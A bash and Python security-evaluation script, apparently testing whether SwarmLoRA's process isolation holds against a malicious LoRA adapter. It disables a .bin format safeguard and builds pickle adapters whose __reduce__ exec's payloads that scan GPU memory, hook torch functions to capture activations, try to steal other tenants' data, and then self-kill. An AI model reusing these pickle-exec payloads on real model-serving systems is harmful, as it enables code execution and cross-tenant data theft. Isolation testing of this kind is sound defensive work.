#!/usr/bin/env bash
# Malicious Adapter — Blind Steal-Then-Crash Attack on SwarmLoRA (REAL .bin execution).
# .bin format check bypassed to test architectural isolation alone.
# Same two-phase payload as S-LoRA: gc recon, then WRS-auth + KCRR-live + AA + SIGKILL.
# Expected: all recovery=0.0, blast_radius=0.0 (process isolation).
# Produces: security_eval/malicious_adapter/results/blind_attack_swarmlora.json

set -u
ROOT="$(git -C "$(dirname "$0")" rev-parse --show-toplevel)"
PY="$ROOT/venv/bin/python"
SEC="$ROOT/security_eval"
DIR="$(cd "$(dirname "$0")" && pwd)"
OUT="${1:-$SEC/malicious_adapter/results/blind_attack_swarmlora.json}"

LIB=$("$PY" -c "import torch,os; print(os.path.dirname(torch.__file__)+'/lib')")
export LD_LIBRARY_PATH="$LIB:${LD_LIBRARY_PATH:-}"
export PYTHONUNBUFFERED=1
export CUDA_VISIBLE_DEVICES=0
unset CUDA_MPS_PIPE_DIRECTORY 2>/dev/null || true

AGG_PORT=50069
AGG_HEALTH=8013
ATK_PORT=5301
VIC_PORTS=(5302 5303 5304 5305)
N_VICTIMS=${#VIC_PORTS[@]}

# Malicious adapters inside security_eval/ so allowlist passes
RECON_DIR="$DIR/real-recon-bin"
TARGETED_DIR="$DIR/real-targeted-bin"
VICTIM_ADAPTER="$ROOT/../sim-adapters/pool-10-r16/lora-1"

WORK=/tmp/blind_attack_swarm
RECON_OUT="$WORK/recon.json"
PAYLOAD_OUT="$WORK/payload_results.json"
BLAST_DIR="$WORK/blast"
LOG="$WORK"
mkdir -p "$WORK" "$BLAST_DIR" "$(dirname "$OUT")" "$RECON_DIR" "$TARGETED_DIR"
rm -f "$RECON_OUT" "$PAYLOAD_OUT" "$BLAST_DIR"/*.txt

MODEL_BUILDER="$ROOT/src/worker/model_builder.py"
MODEL_BUILDER_BAK="$MODEL_BUILDER.sec_eval_backup"

PIDS=()
AGG_PID=""
ATK_PID=""
REQ_PIDS=()
VICTIM_WORKER_PIDS=()

cleanup() {
  echo "[attack] teardown"
  for p in "${REQ_PIDS[@]:-}"; do kill -9 "$p" 2>/dev/null || true; done
  for p in "${PIDS[@]:-}"; do kill -9 "$p" 2>/dev/null || true; done
  [ -n "${AGG_PID:-}" ] && kill -9 "$AGG_PID" 2>/dev/null || true
  pkill -9 -f "_launch_worker.py" 2>/dev/null || true
  # Restore model_builder.py
  if [ -f "$MODEL_BUILDER_BAK" ]; then
    mv "$MODEL_BUILDER_BAK" "$MODEL_BUILDER"
    echo "[attack] model_builder.py restored"
  fi
  rm -rf "$RECON_DIR" "$TARGETED_DIR" 2>/dev/null || true
  sleep 1
}
trap cleanup EXIT

# ── Patch model_builder.py to allow .bin loading ─────────────────────────────
echo "[attack] patching model_builder.py to bypass .bin format check ..."
cp "$MODEL_BUILDER" "$MODEL_BUILDER_BAK"
"$PY" - "$MODEL_BUILDER" <<'PATCH' || { echo "[attack] patch failed — aborting"; exit 1; }
import sys
path = sys.argv[1]
content = open(path).read()
old = (
    "    elif os.path.exists(bin_file):\n"
    "        # Reject .bin — torch.load pickle has known weights_only bypass exploits.\n"
    "        # All supported adapters use safetensors. Convert with:\n"
    "        #   python -c \"from safetensors.torch import save_file; import torch\n"
    "        #   save_file(torch.load('adapter_model.bin', weights_only=True), 'adapter_model.safetensors')\"\n"
    "        raise ValueError(\n"
    "            f\"Adapter at {adapter_path!r} uses .bin format which is not allowed. \"\n"
    "            f\"Convert to safetensors format.\"\n"
    "        )"
)
new = (
    "    elif os.path.exists(bin_file):\n"
    "        # SEC EVAL BYPASS: format check disabled to test architectural isolation.\n"
    "        raw = torch.load(bin_file, map_location=device)\n"
    "        for k, v in raw.items():\n"
    "            if isinstance(v, torch.Tensor):\n"
    "                weights[k] = v.to(dtype=dtype)"
)
if old not in content:
    print("[patch] ERROR: target string not found in model_builder.py — check version")
    sys.exit(1)
open(path, 'w').write(content.replace(old, new))
print("[patch] model_builder.py patched — .bin format check bypassed for sec eval")
PATCH

# ── Build malicious .bin adapters ─────────────────────────────────────────────
echo "[attack] building recon + targeted .bin adapters ..."
"$PY" - "$RECON_DIR" "$TARGETED_DIR" "$RECON_OUT" "$PAYLOAD_OUT" <<'PYEOF'
import sys, os, json, torch
from safetensors.torch import save_file

RECON_DIR    = sys.argv[1]
TARGETED_DIR = sys.argv[2]
RECON_OUT    = sys.argv[3]
PAYLOAD_OUT  = sys.argv[4]

H = 4096; KV = 1024; I = 14336; L = 32; RANK = 8
MODS = [
    ("self_attn.q_proj", H, H),  ("self_attn.k_proj", H, KV),
    ("self_attn.v_proj", H, KV), ("self_attn.o_proj", H, H),
    ("mlp.gate_proj", H, I),     ("mlp.up_proj", H, I),
    ("mlp.down_proj", I, H),
]
CFG = {
    "base_model_name_or_path": "meta-llama/Meta-Llama-3.1-8B-Instruct",
    "bias": "none", "inference_mode": True,
    "lora_alpha": 16, "lora_dropout": 0.0, "peft_type": "LORA", "r": RANK,
    "target_modules": ["q_proj","k_proj","v_proj","o_proj","gate_proj","up_proj","down_proj"],
    "task_type": "CAUSAL_LM",
}

def make_weights(seed):
    torch.manual_seed(seed)
    w = {}
    for i in range(L):
        for mod, in_f, out_f in MODS:
            base = f"base_model.model.model.layers.{i}.{mod}"
            w[f"{base}.lora_A.weight"] = torch.randn(RANK, in_f,  dtype=torch.float16) * 0.02
            w[f"{base}.lora_B.weight"] = torch.zeros(out_f, RANK, dtype=torch.float16)
    return w

# ── Recon adapter (Phase 1) ───────────────────────────────────────────────────
os.makedirs(RECON_DIR, exist_ok=True)
with open(os.path.join(RECON_DIR, "adapter_config.json"), "w") as f:
    json.dump(CFG, f, indent=2)
w_recon = make_weights(11)

RECON_CODE = r"""
import gc as _gc, sys as _sys, json as _json, threading as _threading, time as _time, os as _os

_RECON_OUT = """ + repr(RECON_OUT) + r"""

def _run_recon():
    _time.sleep(8)
    report = {
        "method": "blind CUDA tensor scan — no hardcoded class or attribute names",
        "tensor_objects": [],
        "total_tensor_classes": 0,
        "total_tensors_found": 0,
        "recon_done": False,
        "errors": [],
    }
    try:
        import torch as _torch
        seen_classes = {}
        for obj in _gc.get_objects():
            try:
                t = type(obj)
                tid = f"{t.__module__}.{t.__name__}"
                if tid in seen_classes:
                    continue
                if t.__module__ in ("builtins", "threading", "weakref", "abc"):
                    continue
                tensor_attrs = []
                try:
                    candidates = list(vars(obj).items())[:80]
                    params = getattr(obj, "_parameters", None)
                    if isinstance(params, dict):
                        candidates += list(params.items())[:80]
                    for attr_name, val in candidates:
                        try:
                            if (isinstance(val, _torch.Tensor) and
                                    val.is_cuda and val.numel() > 512):
                                tensor_attrs.append({
                                    "attr": attr_name,
                                    "attr_type": "tensor",
                                    "shape": list(val.shape),
                                    "dtype": str(val.dtype),
                                    "nbytes": val.numel() * val.element_size(),
                                    "sample": val.detach().float().flatten()[:4].tolist(),
                                })
                            elif isinstance(val, (list, tuple)) and len(val) > 0:
                                first = val[0]
                                if (isinstance(first, _torch.Tensor) and
                                        first.is_cuda and first.numel() > 512):
                                    total = sum(t.numel() * t.element_size()
                                                for t in val if isinstance(t, _torch.Tensor))
                                    tensor_attrs.append({
                                        "attr": attr_name,
                                        "attr_type": "list_of_tensors",
                                        "list_len": len(val),
                                        "shape": list(first.shape),
                                        "dtype": str(first.dtype),
                                        "nbytes": total,
                                        "sample": first.detach().float().flatten()[:4].tolist(),
                                    })
                        except Exception:
                            pass
                except Exception:
                    pass
                if tensor_attrs:
                    seen_classes[tid] = {
                        "module": t.__module__,
                        "class": t.__name__,
                        "n_tensor_attrs": len(tensor_attrs),
                        "tensors": tensor_attrs[:4],
                        "total_bytes": sum(a["nbytes"] for a in tensor_attrs),
                    }
                    report["total_tensor_classes"] += 1
                    report["total_tensors_found"] += len(tensor_attrs)
                    if len(seen_classes) >= 25:
                        break
            except Exception:
                pass
        report["tensor_objects"] = list(seen_classes.values())
        # ── Scan for index-like objects: str→int dict + integer CUDA tensors ──
        index_seen = {}
        for obj in _gc.get_objects():
            try:
                t = type(obj); tid = f"{t.__module__}.{t.__name__}"
                if tid in seen_classes or tid in index_seen: continue
                if t.__module__ in ("builtins", "threading", "weakref", "abc"): continue
                dict_attrs = []; int_tensor_attrs = []
                try:
                    for attr_name, val in list(vars(obj).items())[:80]:
                        try:
                            if isinstance(val, dict) and 1 <= len(val) <= 500:
                                ks = list(val.keys())[:3]; vs = list(val.values())[:3]
                                if all(isinstance(k, str) for k in ks) and all(isinstance(v, int) for v in vs):
                                    dict_attrs.append({"attr": attr_name, "len": len(val),
                                                       "sample_keys": ks[:2]})
                            elif (isinstance(val, _torch.Tensor) and
                                  val.dtype in (_torch.int32, _torch.int64) and val.numel() > 0):
                                int_tensor_attrs.append({"attr": attr_name,
                                                         "shape": list(val.shape),
                                                         "dtype": str(val.dtype)})
                        except Exception: pass
                except Exception: pass
                if dict_attrs and int_tensor_attrs:
                    index_seen[tid] = {"module": t.__module__, "class": t.__name__,
                                       "dict_attrs": dict_attrs[:2],
                                       "int_tensor_attrs": int_tensor_attrs[:6]}
                    if len(index_seen) >= 5: break
            except Exception: pass
        report["index_objects"] = list(index_seen.values())
        report["recon_done"] = True
    except Exception as e:
        report["errors"].append(str(e)[:200])
    with open(_RECON_OUT, "w") as _f:
        _json.dump(report, _f, indent=2)

_threading.Thread(target=_run_recon, daemon=True).start()
"""

class _ReconPayload:
    def __reduce__(self):
        import builtins
        return (builtins.exec, (RECON_CODE, {}))

w_recon["__recon_payload__"] = _ReconPayload()
torch.save(w_recon, os.path.join(RECON_DIR, "adapter_model.bin"))
print(f"  recon    : .bin, blind gc fingerprint payload ({L*len(MODS)*2} tensors + payload)")

# ── Targeted adapter (Phase 2) ────────────────────────────────────────────────
os.makedirs(TARGETED_DIR, exist_ok=True)
with open(os.path.join(TARGETED_DIR, "adapter_config.json"), "w") as f:
    json.dump(CFG, f, indent=2)
w_targeted = make_weights(99)

TARGETED_CODE = r"""
import gc as _gc, sys as _sys, json as _json, threading as _threading, time as _time, os as _os

_RECON_OUT   = """ + repr(RECON_OUT) + r"""
_PAYLOAD_OUT = """ + repr(PAYLOAD_OUT) + r"""
_OWN_DIRS    = """ + repr({RECON_DIR, TARGETED_DIR}) + r"""

_state = {
    "pid": _os.getpid(),
    "chain_a_executed": True,
    "blind_extraction": {
        "own_objects_read": 0,
        "own_tensors_read": 0,
        "own_bytes_read": 0,
        "classes_found": [],
        "sample_objects": [],
        "victim_objects": 0,
        "victim_bytes": 0,
        "note": "",
    },
    "wrs_auth": {
        "idx_map_found": False,
        "victim_paths_found": [],
        "victim_cells_count": 0,
        "atk_cells_count": 0,
        "cells_disjoint": False,
        "victim_vs_attacker_cosine_sim": None,
        "victim_data_sample": None,
        "atk_data_sample": None,
        "recovery": 0.0,
    },
    "kcrr_live": {
        "baseline_cells": 0,
        "peak_kv_cells": 0,
        "kv_nonzero_seen": 0,
        "kv_nonzero_fraction": 0.0,
        "sample_kv": None,
        "scans": 0,
        "recovery": 0.0,
    },
    "aa": {
        "hooked": False,
        "modules_hooked": [],
        "activations_captured": 0,
        "C_before": 0,
        "C_victim": 0,
        "N_victim_tokens_expected": 2015,
        "per_token_rate": 0.0,
        "duck_module_hooks": 0,
        "recovery": 0.0,
        "sample_activation": None,
        "method": "blind global patch (torch.mm + torch.matmul/bmm + F.linear) + duck-typed gc hooks",
    },
    "fault": {"injected": False, "method": "os.kill(pid, SIGKILL)",
              "intent": "crash attacker worker — in SwarmLoRA only affects own process"},
}
_allocator_ref = [None]

def _save():
    try:
        with open(_PAYLOAD_OUT, "w") as _f:
            _json.dump(_state, _f, indent=2)
    except:
        pass

def _bg_save():
    while True:
        _save()
        _time.sleep(2)
_threading.Thread(target=_bg_save, daemon=True).start()

def _install_and_steal():
    _time.sleep(10)
    for _ in range(30):
        if _os.path.exists(_RECON_OUT):
            break
        _time.sleep(1)

    recon = {}
    if _os.path.exists(_RECON_OUT):
        try:
            recon = _json.load(open(_RECON_OUT))
        except Exception:
            pass

    # ── Blind extraction: use Phase 1 class list to read all accessible tensor data ──
    import torch as _torch
    be = _state["blind_extraction"]
    be["classes_found"] = [f"{o['module']}.{o['class']}" for o in recon.get("tensor_objects", [])]

    for obj_info in recon.get("tensor_objects", []):
        mod_name = obj_info["module"]
        cls_name = obj_info["class"]
        try:
            mod = _sys.modules.get(mod_name) or __import__(mod_name, fromlist=[cls_name])
            cls = getattr(mod, cls_name)
        except Exception:
            continue
        for gc_obj in _gc.get_objects():
            try:
                if not isinstance(gc_obj, cls):
                    continue
                obj_tensors = 0
                obj_bytes = 0
                for attr_info in obj_info.get("tensors", []):
                    try:
                        val = getattr(gc_obj, attr_info["attr"], None)
                        if isinstance(val, _torch.Tensor) and val.is_cuda:
                            obj_tensors += 1
                            obj_bytes += val.numel() * val.element_size()
                            if len(be["sample_objects"]) < 3 and val.numel() > 0:
                                be["sample_objects"].append({
                                    "class": cls_name, "attr": attr_info["attr"],
                                    "shape": list(val.shape),
                                    "sample": val.detach().float().flatten()[:4].tolist(),
                                })
                        elif attr_info.get("attr_type") == "list_of_tensors" and isinstance(val, (list, tuple)):
                            for t in val:
                                if isinstance(t, _torch.Tensor) and t.is_cuda:
                                    obj_tensors += 1
                                    obj_bytes += t.numel() * t.element_size()
                            if len(be["sample_objects"]) < 3 and len(val) > 0:
                                first = val[0]
                                if isinstance(first, _torch.Tensor) and first.numel() > 0:
                                    be["sample_objects"].append({
                                        "class": cls_name, "attr": attr_info["attr"],
                                        "note": f"list of {len(val)} tensors",
                                        "shape": list(first.shape),
                                        "sample": first.detach().float().flatten()[:4].tolist(),
                                    })
                    except Exception:
                        pass
                if obj_tensors > 0:
                    be["own_objects_read"] += 1
                    be["own_tensors_read"] += obj_tensors
                    be["own_bytes_read"] += obj_bytes
            except Exception:
                pass

    be["victim_objects"] = 0
    be["victim_bytes"] = 0
    n_cls = len(be["classes_found"])
    n_mib = be["own_bytes_read"] // (1024 * 1024)
    be["note"] = (
        f"Phase 1 found {n_cls} class(es) holding large CUDA tensors via blind scan. "
        f"Phase 2 read {be['own_objects_read']} instance(s), {be['own_tensors_read']} tensors, "
        f"{n_mib} MiB — all attacker's own process data. "
        f"Victim data: 0 bytes — victim workers run in separate OS processes, "
        f"structurally unreachable via gc.get_objects()."
    )
    _save()

    # ── Structural detection: find shared memory pool (MemPoolClass) ─────────
    # SwarmLoRA has no shared pool → MemPoolClass stays None → WRS/KCRR
    # produce recovery=0.0 organically (not hardcoded).
    MemPoolClass = None; status_attr = None; data_attr = None
    for obj_info in recon.get("tensor_objects", []):
        tensors = obj_info.get("tensors", [])
        status_cands = [t for t in tensors if t.get("attr_type") == "tensor"
                        and len(t.get("shape", [])) == 1]
        data_cands   = [t for t in tensors if t.get("attr_type") == "list_of_tensors"
                        and t.get("list_len", 0) >= 2]
        if status_cands and data_cands:
            mod_name = obj_info["module"]; cls_name = obj_info["class"]
            try:
                mod = _sys.modules.get(mod_name) or __import__(mod_name, fromlist=[cls_name])
                MemPoolClass = getattr(mod, cls_name)
                status_attr = status_cands[0]["attr"]
                data_attr   = data_cands[0]["attr"]
            except Exception as e:
                pass
            break

    # ── Record KCRR baseline immediately ─────────────────────────────────────
    baseline_cells = set()
    if MemPoolClass is not None:
        try:
            for _obj in _gc.get_objects():
                if isinstance(_obj, MemPoolClass):
                    ms = getattr(_obj, status_attr)
                    baseline_cells = set((ms == 0).nonzero(as_tuple=False).view(-1).tolist())
                    _state["kcrr_live"]["baseline_cells"] = len(baseline_cells)
                    _allocator_ref[0] = _obj
                    break
        except Exception: pass

    # ── WRS-auth: resolve victim adapter cells via index structure ────────────
    # In SwarmLoRA: no InferAdapter → index_objects is empty → idx_map_found=False → recovery=0.0
    wrs = _state["wrs_auth"]
    for idx_info in recon.get("index_objects", []):
        mod_name = idx_info["module"]; cls_name = idx_info["class"]
        try:
            mod = _sys.modules.get(mod_name) or __import__(mod_name, fromlist=[cls_name])
            IdxCls = getattr(mod, cls_name)
        except Exception: continue
        found_instance = False
        for gc_obj in _gc.get_objects():
            try:
                if not isinstance(gc_obj, IdxCls): continue
                da = idx_info["dict_attrs"][0]["attr"]
                idx_map = getattr(gc_obj, da, None)
                if not isinstance(idx_map, dict) or not idx_map: continue
                wrs["idx_map_found"] = True
                victim_paths = [p for p in idx_map if p not in _OWN_DIRS]
                wrs["victim_paths_found"] = victim_paths[:3]
                if not victim_paths: break
                it_list = sorted(
                    [(x["attr"], getattr(gc_obj, x["attr"], None))
                     for x in idx_info["int_tensor_attrs"]
                     if getattr(gc_obj, x["attr"], None) is not None],
                    key=lambda kv: kv[1].numel(), reverse=True
                )
                if len(it_list) < 3: break
                loc_t = it_list[0][1]
                cand_a = it_list[1][1]; cand_b = it_list[2][1]
                try:
                    start_t, len_t = (cand_a, cand_b) if cand_a[0].item() == 0 else (cand_b, cand_a)
                except Exception:
                    start_t, len_t = cand_a, cand_b
                v_idx = idx_map[victim_paths[0]]
                own_in_map = [p for p in _OWN_DIRS if p in idx_map]
                if not own_in_map: break
                a_idx = idx_map[own_in_map[0]]
                try:
                    v_s = start_t[v_idx].item(); v_l = len_t[v_idx].item()
                    a_s = start_t[a_idx].item(); a_l = len_t[a_idx].item()
                    v_cells = loc_t[v_s:v_s+v_l].tolist()
                    a_cells = loc_t[a_s:a_s+a_l].tolist()
                except Exception as e:
                    wrs["cell_resolve_error"] = str(e); break
                wrs["victim_cells_count"] = len(v_cells)
                wrs["atk_cells_count"]    = len(a_cells)
                wrs["cells_disjoint"]     = not bool(set(v_cells) & set(a_cells))
                if MemPoolClass is not None and v_cells and a_cells:
                    for pool_obj in _gc.get_objects():
                        if not isinstance(pool_obj, MemPoolClass): continue
                        dp = getattr(pool_obj, data_attr)
                        v_vecs = []; a_vecs = []
                        for layer in dp:
                            for c in v_cells[:4]:
                                if c < layer.shape[0]: v_vecs.append(layer[c].detach().float().flatten())
                            for c in a_cells[:4]:
                                if c < layer.shape[0]: a_vecs.append(layer[c].detach().float().flatten())
                        if v_vecs and a_vecs:
                            import torch.nn.functional as _Fn
                            v_vec = _torch.cat(v_vecs[:16])
                            a_vec = _torch.cat(a_vecs[:16])[:v_vec.shape[0]]
                            cos_sim = round(float(_Fn.cosine_similarity(
                                v_vec.unsqueeze(0), a_vec.unsqueeze(0))), 4)
                            wrs["victim_vs_attacker_cosine_sim"] = cos_sim
                            wrs["victim_data_sample"] = [round(float(x),5) for x in v_vecs[0][:5].tolist()]
                            wrs["atk_data_sample"]    = [round(float(x),5) for x in a_vecs[0][:5].tolist()]
                            wrs["recovery"] = 1.0
                        break
                found_instance = True
            except Exception: pass
            if found_instance: break
        if wrs["idx_map_found"]: break

    # ── KCRR-live: scan for NEW cells (delta from baseline = KV cache only) ──
    # In SwarmLoRA: MemPoolClass is None → skipped → peak_kv_cells=0 → recovery=0.0
    if MemPoolClass is not None:
        def _live_scan():
            kv_peak = 0
            while True:
                _time.sleep(0.4)
                alloc = _allocator_ref[0]
                if alloc is None: continue
                try:
                    ms = getattr(alloc, status_attr)
                    current  = set((ms == 0).nonzero(as_tuple=False).view(-1).tolist())
                    kv_cells = current - baseline_cells
                    n_kv = len(kv_cells)
                    if n_kv > kv_peak:
                        kv_peak = n_kv
                        _state["kcrr_live"]["peak_kv_cells"] = n_kv
                    if n_kv > 0:
                        dp = getattr(alloc, data_attr)
                        nonzero = 0
                        sample  = _state["kcrr_live"]["sample_kv"]
                        checked = 0
                        for c in list(kv_cells)[:50]:
                            for layer in dp:
                                checked += 1
                                if c < layer.shape[0] and bool(layer[c].any()):
                                    nonzero += 1
                                    if sample is None:
                                        sample = [round(float(x),5) for x in layer[c].flatten()[:5].tolist()]
                                        _state["kcrr_live"]["sample_kv"] = sample
                                    break
                        _state["kcrr_live"]["scans"] += 1
                        _state["kcrr_live"]["kv_nonzero_seen"] += nonzero
                        if checked > 0:
                            _state["kcrr_live"]["kv_nonzero_fraction"] = round(nonzero / checked, 3)
                        if nonzero > 0:
                            _state["kcrr_live"]["recovery"] = 1.0
                except Exception: pass
        _threading.Thread(target=_live_scan, daemon=True).start()

    # ── AA: record baseline captures (= 0; no inference running at T=10) ─────
    _state["aa"]["C_before"] = _state["aa"]["activations_captured"]

    # ── AA: blind global function patch + duck-typed gc hooks ─────────────────
    try:
        _torch_mod = _sys.modules.get("torch") or __import__("torch")
        _aa = _state["aa"]

        def _capture(result):
            try:
                if hasattr(result, 'is_cuda') and result.is_cuda and result.numel() > 4096:
                    _aa["activations_captured"] += 1
                    if _aa["sample_activation"] is None:
                        _aa["sample_activation"] = [
                            round(float(x), 5)
                            for x in result.detach().float().flatten()[:5].tolist()
                        ]
                        _aa["recovery"] = 1.0
            except Exception:
                pass

        _patched = []
        try:
            _orig_mm = _torch_mod.mm
            def _p_mm(*args, **kw):
                r = _orig_mm(*args, **kw); _capture(r); return r
            _torch_mod.mm = _p_mm; _patched.append("torch.mm")
        except Exception: pass
        try:
            _orig_matmul = _torch_mod.matmul
            def _p_matmul(*args, **kw):
                r = _orig_matmul(*args, **kw); _capture(r); return r
            _torch_mod.matmul = _p_matmul; _patched.append("torch.matmul")
        except Exception: pass
        try:
            _orig_bmm = _torch_mod.bmm
            def _p_bmm(*args, **kw):
                r = _orig_bmm(*args, **kw); _capture(r); return r
            _torch_mod.bmm = _p_bmm; _patched.append("torch.bmm")
        except Exception: pass
        try:
            _F = _sys.modules.get("torch.nn.functional")
            if _F is not None:
                _orig_Flin = _F.linear
                def _p_Flin(*args, **kw):
                    r = _orig_Flin(*args, **kw); _capture(r); return r
                _F.linear = _p_Flin; _patched.append("F.linear")
        except Exception: pass

        def _module_hook(mod, inp, out):
            try:
                t = out[0] if isinstance(out, (tuple, list)) else out
                if hasattr(t, 'is_cuda'): _capture(t)
            except Exception: pass

        _module_hooks = 0; _duck_types = set()
        for _obj in _gc.get_objects():
            try:
                if (hasattr(_obj, '_forward_hooks') and hasattr(_obj, '_modules') and
                        callable(getattr(_obj, 'register_forward_hook', None))):
                    _obj.register_forward_hook(_module_hook)
                    _duck_types.add(type(_obj).__name__)
                    _module_hooks += 1
                    if _module_hooks >= 300: break
            except Exception: pass

        _aa["hooked"]         = len(_patched) > 0 or _module_hooks > 0
        _aa["modules_hooked"] = _patched + list(_duck_types)[:5]
        _aa["duck_module_hooks"] = _module_hooks
        _aa["method"] = "blind global patch (torch.mm + torch.matmul/bmm + F.linear) + duck-typed gc hooks"
    except Exception as _e:
        _state["aa"]["error"] = str(_e)

    _save()

    # ── Fault injection ───────────────────────────────────────────────────────
    # In SwarmLoRA: SIGKILL on attacker's worker process.
    # Each victim runs in its OWN OS process — this kill does not affect them.
    _time.sleep(15)
    c_total = _state["aa"]["activations_captured"]
    c_before = _state["aa"]["C_before"]
    c_victim = c_total - c_before
    n_expect = _state["aa"]["N_victim_tokens_expected"]
    _state["aa"]["C_victim"]       = c_victim
    _state["aa"]["per_token_rate"] = round(c_victim / n_expect, 2) if n_expect > 0 else 0.0
    _state["fault"]["injected"] = True
    _save()
    _time.sleep(2)
    import signal as _signal
    _os.kill(_os.getpid(), _signal.SIGKILL)

_threading.Thread(target=_install_and_steal, daemon=True).start()
_save()
"""

class _TargetedPayload:
    def __reduce__(self):
        import builtins
        return (builtins.exec, (TARGETED_CODE, {}))

w_targeted["__targeted_payload__"] = _TargetedPayload()
torch.save(w_targeted, os.path.join(TARGETED_DIR, "adapter_model.bin"))
print(f"  targeted : .bin, steal-then-crash payload ({L*len(MODS)*2} tensors + payload)")
PYEOF

# ── Launch aggregator ──────────────────────────────────────────────────────────
echo ""
echo "[attack] starting aggregator (grpc:$AGG_PORT health:$AGG_HEALTH) ..."
PYTHONPATH=$ROOT/src:$ROOT "$PY" src/aggregator.py \
  --device cuda:0 --port "$AGG_PORT" --health-port "$AGG_HEALTH" \
  > "$LOG/agg.log" 2>&1 &
AGG_PID=$!
PIDS+=("$AGG_PID")
AGG_UP=0
for i in $(seq 1 60); do
  curl -sf -m 2 "http://localhost:$AGG_HEALTH/health" >/dev/null 2>&1 && { echo "[attack] aggregator healthy (${i}s)"; AGG_UP=1; break; }
  kill -0 "$AGG_PID" 2>/dev/null || { echo "[attack] aggregator died"; tail -20 "$LOG/agg.log"; exit 1; }
  sleep 1
done
[ "$AGG_UP" = 1 ] || { echo "[attack] aggregator never healthy"; exit 1; }

# ── Launch attacker worker with recon.bin ──────────────────────────────────────
echo "[attack] ── Phase 1 : blind gc fingerprint — scan own process heap ─────────────────"
echo "[attack] starting attacker worker (port $ATK_PORT, recon.bin) ..."
PYTHONPATH=$ROOT/src:$ROOT "$PY" "$SEC/common/_launch_worker.py" \
  --http-port "$ATK_PORT" --agg-host localhost --agg-port "$AGG_PORT" \
  --device cuda:0 --lora "$RECON_DIR" \
  > "$LOG/atk.log" 2>&1 &
ATK_PID=$!
PIDS+=("$ATK_PID")
ATK_READY=0
for i in $(seq 1 90); do
  st=$(curl -s "http://localhost:$ATK_PORT/health" 2>/dev/null | grep -o '"status": *"ready"')
  [ -n "$st" ] && { echo "[attack] attacker worker ready (${i}s) — recon payload running"; ATK_READY=1; break; }
  kill -0 "$ATK_PID" 2>/dev/null || { echo "[attack] attacker worker died"; tail -30 "$LOG/atk.log"; exit 1; }
  sleep 1
done
[ "$ATK_READY" = 1 ] || { echo "[attack] attacker worker never ready after 90s"; exit 1; }

# ── Start victim workers (early — overlap with recon wait) ────────────────────
# Start victims NOW so they are ready before the swap. Victim startup (~30-60s)
# overlaps with the 27s recon wait, so by the time we swap, all victims are ready.
echo "[attack] starting $N_VICTIMS victim workers in parallel with recon wait ..."
lora_idx=2
for vport in "${VIC_PORTS[@]}"; do
  PYTHONPATH=$ROOT/src:$ROOT "$PY" "$SEC/common/_launch_worker.py" \
    --http-port "$vport" --agg-host localhost --agg-port "$AGG_PORT" \
    --device cuda:0 --lora "../sim-adapters/pool-10-r16/lora-$lora_idx" \
    > "$LOG/victim_${vport}.log" 2>&1 &
  vpid=$!
  VICTIM_WORKER_PIDS+=("$vpid")
  PIDS+=("$vpid")
  lora_idx=$((lora_idx + 1))
done

# ── Wait for Phase 1 recon to complete ────────────────────────────────────────
# Recon thread sleeps 8s. Victim workers start in parallel during this wait.
echo "[attack] waiting 18s for victim workers and recon to complete ..."
sleep 18
if [ -f "$RECON_OUT" ]; then
  n_found=$("$PY" -c "import json; d=json.load(open('$RECON_OUT')); print(d.get('total_tensor_classes',0))")
  echo "[attack] recon complete: $n_found tensor-bearing classes found (attacker process only — no cross-tenant visibility)"
else
  echo "[attack] WARNING: recon.json not written yet — continuing anyway"
fi

# ── Wait for all victim workers to be ready ───────────────────────────────────
for idx in "${!VIC_PORTS[@]}"; do
  vport="${VIC_PORTS[$idx]}"
  vpid="${VICTIM_WORKER_PIDS[$idx]}"
  VREADY=0
  for i in $(seq 1 90); do
    st=$(curl -s "http://localhost:$vport/health" 2>/dev/null | grep -o '"status": *"ready"')
    [ -n "$st" ] && { echo "[attack] victim worker $vport ready (${i}s)"; VREADY=1; break; }
    kill -0 "$vpid" 2>/dev/null || { echo "[attack] victim worker $vport died"; tail -20 "$LOG/victim_${vport}.log"; exit 1; }
    sleep 1
  done
  [ "$VREADY" = 1 ] || { echo "[attack] victim worker $vport never ready after 90s"; exit 1; }
done
echo "[attack] all victim workers ready"

# ── Swap attacker to targeted.bin (Phase 2) ───────────────────────────────────
echo "[attack] ── Phase 2 : steal weights + KV cache + activations, then crash ──────────"
echo "[attack] swapping attacker adapter to targeted.bin ..."
SWAP_RESP=$(curl -s -m 30 -X POST "http://localhost:$ATK_PORT/swap_adapter" \
  -H 'Content-Type: application/json' \
  -d "{\"adapter_id\": \"$TARGETED_DIR\"}" 2>/dev/null || echo '{"error":"swap failed"}')
echo "[attack] swap response: $SWAP_RESP"
echo "[attack] targeted payload running — sleeps 10s, installs hooks, steals 15s, then crashes"

# ── Send long victim requests immediately after swap ──────────────────────────
LONG_PROMPT='{"prompt": "Once upon a time in a land far away there lived a wise and powerful wizard who guarded the ancient secrets of the forest, the mountains, and the deep oceans.", "max_tokens": 200, "do_sample": false}'
echo "[attack] sending $N_VICTIMS long victim requests (200 tokens each) ..."
i=1
for vport in "${VIC_PORTS[@]}"; do
  (
    code=$(curl -sf -m 60 -X POST "http://localhost:$vport/inference" \
      -H 'Content-Type: application/json' -o /dev/null -w "%{http_code}" \
      -d "$LONG_PROMPT" 2>/dev/null || echo "000")
    echo "$code" > "$BLAST_DIR/victim_${i}_code.txt"
  ) &
  REQ_PIDS+=($!)
  i=$((i+1))
done
echo "[attack] $N_VICTIMS victim requests in-flight ..."

# ── Wait for targeted payload to crash attacker worker ────────────────────────
echo "[attack] waiting for attacker worker crash and victims to complete ..."
wait "${REQ_PIDS[@]}" 2>/dev/null || true
echo "[attack] victim requests settled"

FAILED=0; SUCCEEDED=0
i=1
for vport in "${VIC_PORTS[@]}"; do
  code=$(cat "$BLAST_DIR/victim_${i}_code.txt" 2>/dev/null | tr -d '[:space:]' | tail -c 3)
  if [ "$code" = "200" ]; then
    SUCCEEDED=$((SUCCEEDED+1))
    echo "  victim $i ($vport): HTTP 200 (survived)"
  else
    FAILED=$((FAILED+1))
    echo "  victim $i ($vport): HTTP ${code:-???} (failed)"
  fi
  i=$((i+1))
done
echo "[attack] blast summary: $FAILED/$N_VICTIMS victims killed"

# ── Check attacker worker is actually dead ─────────────────────────────────────
ATK_DEAD=0
kill -0 "$ATK_PID" 2>/dev/null || ATK_DEAD=1
[ "$ATK_DEAD" = "1" ] && echo "[attack] attacker worker confirmed dead (self-terminated)" || echo "[attack] attacker worker still alive"

# ── Check server recovery (victim workers still healthy) ──────────────────────
RECOVERY=0
for vport in "${VIC_PORTS[@]}"; do
